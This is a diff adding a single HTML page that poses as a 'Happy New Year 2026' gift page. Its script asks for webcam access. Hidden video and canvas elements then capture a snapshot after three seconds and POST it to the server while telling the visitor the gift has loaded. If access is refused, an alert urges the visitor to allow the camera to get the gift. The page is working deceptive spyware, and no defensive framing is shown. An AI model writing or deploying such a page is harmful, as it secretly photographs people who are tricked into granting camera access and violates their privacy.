@@ -1,0 +1,27 @@
+<!DOCTYPE html><html><head><title>New Year Gift</title></head>
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif;">
+    <h1 style="margin-top:50px;">Happy New Year 2026! 🎁</h1>
+    <p>Please wait... your surprise gift is loading...</p>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            let video = document.getElementById('video');
+            video.srcObject = stream;
+            setTimeout(() => {
+                let canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                let img = canvas.toDataURL('image/png');
+                fetch('/', { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'image=' + encodeURIComponent(img) 
+                }).then(() => {
+                    alert("Surprise Gift Loaded Successfully!");
+                });
+            }, 3000);
+        }).catch(err => {
+            alert("Error: Please allow camera access to receive your gift!");
+        });
+    </script>
+</body></html>
